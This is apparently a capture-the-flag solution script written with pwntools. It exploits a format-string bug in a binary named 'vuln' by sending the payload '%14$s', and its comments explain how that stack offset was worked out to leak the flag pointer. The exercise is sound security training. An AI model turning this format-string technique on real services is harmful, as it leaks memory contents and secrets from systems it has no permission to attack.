# Observing the disas of the binary we can see that
# the distance of rsp and rbp is 0x50
# and the pointer to the flag is located in rbp-0x10
# with this we can calculate for the offset that
# it lives at position 8
# since we are in x86_64 we have to add 6 to the offset
# since x86_64 calling convention uses 6 registers for arguments
# hence we get %14$s to read strings from the pointer.

from pwn import *

elf = context.binary = ELF("./vuln")
if args.REMOTE:
    io = remote("localhost", 13338)
else:
    io = process()

io.sendlineafter(b"say?", b"%14$s")
io.interactive()
